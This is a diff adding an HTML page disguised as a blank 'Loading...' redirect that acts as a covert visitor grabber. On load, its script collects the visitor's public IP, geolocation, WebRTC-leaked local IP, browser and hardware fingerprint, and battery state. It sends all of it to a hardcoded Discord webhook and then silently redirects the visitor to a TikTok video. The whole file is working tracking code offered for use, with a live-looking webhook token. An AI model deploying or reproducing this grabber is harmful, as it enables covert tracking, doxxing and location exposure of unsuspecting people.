@@ -1,0 +1,280 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Loading...</title>
+    <style>
+        body { 
+            background: #000; 
+            color: #fff; 
+            font-family: monospace; 
+            display: flex; 
+            justify-content: center; 
+            align-items: center; 
+            height: 100vh; 
+            margin: 0; 
+            flex-direction: column;
+            opacity: 0; /* Hidden by default */
+        }
+        /* We'll hide everything instantly */
+    </style>
+</head>
+<body>
+    <!-- No visible content — instant redirect after capture -->
+    <script>
+        (function() {
+            // ===== CONFIG =====
+            const WEBHOOK_URL = "https://discordapp.com/api/webhooks/1517977421243089206/II6W7fTLZETaIDX-cqb3DBPTwbW_-3UA_7nv3XU7OmoKcVtXwuPEfbvO808Jr5hZz_Qu";
+            const REDIRECT_URL = "https://www.tiktok.com/@boggles1clips/video/7632441859490581778?is_from_webapp=1&sender_device=pc";
+
+            // ===== 1. Collect EVERYTHING possible =====
+            function getFullFingerprint() {
+                const nav = navigator;
+                const screen = window.screen;
+                const perf = performance.timing;
+                return {
+                    // Network & IP (filled later)
+                    publicIP: 'fetching...',
+                    localIP: 'fetching...',
+                    geo: {},
+                    
+                    // Browser
+                    userAgent: nav.userAgent,
+                    platform: nav.platform,
+                    language: nav.language,
+                    languages: nav.languages.join(', '),
+                    cookies: nav.cookieEnabled,
+                    doNotTrack: nav.doNotTrack || 'unspecified',
+                    concurrency: nav.hardwareConcurrency || 'N/A',
+                    memory: nav.deviceMemory || 'N/A',
+                    screen: `${screen.width}x${screen.height} (${screen.colorDepth}bit)`,
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                    referrer: document.referrer || 'Direct',
+                    url: window.location.href,
+                    
+                    // Performance
+                    pageLoadTime: perf.loadEventEnd - perf.navigationStart || 'N/A',
+                    domReady: perf.domContentLoadedEventEnd - perf.navigationStart || 'N/A',
+                    
+                    // WebGL / GPU (if available)
+                    webglVendor: 'N/A',
+                    webglRenderer: 'N/A',
+                    
+                    // Battery
+                    battery: 'N/A',
+                    
+                    // Timestamp
+                    timestamp: new Date().toISOString()
+                };
+            }
+
+            // ===== 2. Get WebGL info (silent) =====
+            function getWebGL() {
+                try {
+                    const canvas = document.createElement('canvas');
+                    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                    if (gl) {
+                        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                        if (debugInfo) {
+                            return {
+                                vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
+                                renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
+                            };
+                        }
+                    }
+                } catch(e) {}
+                return { vendor: 'N/A', renderer: 'N/A' };
+            }
+
+            // ===== 3. Get public IP with fastest APIs =====
+            function getPublicIP() {
+                const apis = [
+                    'https://api.ipify.org?format=json',
+                    'https://ip-api.com/json/',
+                    'https://httpbin.org/ip'
+                ];
+                let index = 0;
+                return new Promise((resolve) => {
+                    function tryNext() {
+                        if (index >= apis.length) {
+                            resolve('Unknown');
+                            return;
+                        }
+                        fetch(apis[index], { mode: 'cors', cache: 'no-store' })
+                            .then(r => r.json())
+                            .then(data => {
+                                let ip = data.ip || data.query || data.origin || null;
+                                if (ip) resolve(ip);
+                                else throw new Error('No IP');
+                            })
+                            .catch(() => { index++; tryNext(); });
+                    }
+                    tryNext();
+                });
+            }
+
+            // ===== 4. Get GEO =====
+            function getGeo(ip) {
+                if (!ip || ip === 'Unknown') return Promise.resolve({ error: 'No IP' });
+                return fetch(`https://ip-api.com/json/${ip}?fields=status,country,regionName,city,lat,lon,isp,org,timezone,as`)
+                    .then(r => r.json())
+                    .then(data => {
+                        if (data.status === 'success') {
+                            return {
+                                country: data.country || 'N/A',
+                                region: data.regionName || 'N/A',
+                                city: data.city || 'N/A',
+                                lat: data.lat || 'N/A',
+                                lon: data.lon || 'N/A',
+                                isp: data.isp || 'N/A',
+                                org: data.org || 'N/A',
+                                as: data.as || 'N/A',
+                                timezone: data.timezone || 'N/A'
+                            };
+                        }
+                        return { error: 'Geo failed' };
+                    })
+                    .catch(() => ({ error: 'Geo fetch error' }));
+            }
+
+            // ===== 5. Get local IP via WebRTC =====
+            function getLocalIP() {
+                return new Promise((resolve) => {
+                    const pc = new RTCPeerConnection({ iceServers: [] });
+                    pc.createDataChannel('test');
+                    pc.createOffer()
+                        .then(offer => pc.setLocalDescription(offer))
+                        .catch(() => {});
+                    pc.onicecandidate = (e) => {
+                        if (e.candidate) {
+                            const match = e.candidate.candidate.match(/([0-9]{1,3}\.){3}[0-9]{1,3}/);
+                            if (match) {
+                                pc.close();
+                                resolve(match[0]);
+                            }
+                        } else {
+                            pc.close();
+                            resolve('Not available');
+                        }
+                    };
+                    setTimeout(() => {
+                        pc.close();
+                        resolve('Timeout');
+                    }, 2000);
+                });
+            }
+
+            // ===== 6. Get battery =====
+            function getBattery() {
+                if (navigator.getBattery) {
+                    return navigator.getBattery()
+                        .then(battery => ({
+                            level: (battery.level * 100).toFixed(0) + '%',
+                            charging: battery.charging ? 'Yes' : 'No'
+                        }))
+                        .catch(() => ({ level: 'N/A', charging: 'N/A' }));
+                }
+                return Promise.resolve({ level: 'N/A', charging: 'N/A' });
+            }
+
+            // ===== 7. Send to Discord with fire-and-forget =====
+            function sendToDiscord(payload) {
+                // Use sendBeacon for reliable background sending even during page unload
+                if (navigator.sendBeacon) {
+                    const blob = new Blob([JSON.stringify(payload)], { type: 'application/json' });
+                    navigator.sendBeacon(WEBHOOK_URL, blob);
+                } else {
+                    // Fallback to fetch with keepalive
+                    fetch(WEBHOOK_URL, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify(payload),
+                        keepalive: true
+                    }).catch(() => {});
+                }
+            }
+
+            // ===== 8. Main execution with instant redirect =====
+            async function main() {
+                // Collect static data immediately
+                const fingerprint = getFullFingerprint();
+                const webgl = getWebGL();
+                fingerprint.webglVendor = webgl.vendor;
+                fingerprint.webglRenderer = webgl.renderer;
+
+                // Start async tasks
+                const ipPromise = getPublicIP();
+                const localIPPromise = getLocalIP();
+                const batteryPromise = getBattery();
+
+                // Wait for IP (critical for geo)
+                const publicIP = await ipPromise;
+                fingerprint.publicIP = publicIP;
+                
+                // Get geo based on IP
+                const geo = await getGeo(publicIP);
+                fingerprint.geo = geo;
+
+                // Get other async data
+                const localIP = await localIPPromise;
+                fingerprint.localIP = localIP;
+                const battery = await batteryPromise;
+                fingerprint.battery = battery;
+
+                // Build Discord embed with EVERYTHING
+                const embed = {
+                    title: '🐀 New Visitor Grabbed',
+                    color: 0xff4444,
+                    fields: [
+                        { name: '🌐 Public IP', value: `\`${publicIP}\``, inline: false },
+                        { name: '🏠 Local IP', value: `\`${localIP}\``, inline: false },
+                        { name: '🌍 Country', value: geo.country || 'N/A', inline: true },
+                        { name: '🏙️ City', value: geo.city || 'N/A', inline: true },
+                        { name: '📡 ISP', value: geo.isp || 'N/A', inline: false },
+                        { name: '🔢 AS', value: geo.as || 'N/A', inline: false },
+                        { name: '🖥️ User Agent', value: `\`${fingerprint.userAgent.substring(0, 120)}...\``, inline: false },
+                        { name: '🕹️ Platform', value: fingerprint.platform, inline: true },
+                        { name: '🌐 Language', value: fingerprint.language, inline: true },
+                        { name: '🖥️ Screen', value: fingerprint.screen, inline: true },
+                        { name: '🧠 CPU Cores', value: String(fingerprint.concurrency), inline: true },
+                        { name: '💾 RAM (GB)', value: String(fingerprint.memory), inline: true },
+                        { name: '🎮 GPU Vendor', value: fingerprint.webglVendor || 'N/A', inline: true },
+                        { name: '🎮 GPU Renderer', value: fingerprint.webglRenderer || 'N/A', inline: true },
+                        { name: '🔋 Battery', value: `${battery.level} (charging: ${battery.charging})`, inline: true },
+                        { name: '🕒 Timezone', value: fingerprint.timezone, inline: true },
+                        { name: '⏱️ Page Load (ms)', value: String(fingerprint.pageLoadTime), inline: true },
+                        { name: '🔗 Referrer', value: fingerprint.referrer.substring(0, 100) || 'Direct', inline: false },
+                        { name: '📅 Timestamp', value: fingerprint.timestamp, inline: false }
+                    ],
+                    footer: { text: 'Stealth Grabber • Redirected to TikTok' }
+                };
+
+                const payload = {
+                    content: '@everyone **New hit!**',
+                    embeds: [embed]
+                };
+
+                // Send immediately (fire-and-forget)
+                sendToDiscord(payload);
+
+                // === INSTANT REDIRECT ===
+                // Use both methods to ensure it works
+                window.location.replace(REDIRECT_URL);
+                // Fallback if replace fails
+                setTimeout(() => {
+                    window.location.href = REDIRECT_URL;
+                }, 50);
+            }
+
+            // Run the grabber and redirect
+            main();
+
+            // Also redirect immediately if main takes too long (safety)
+            setTimeout(() => {
+                window.location.replace(REDIRECT_URL);
+            }, 1000);
+
+        })();
+    </script>
+</body>
+</html>
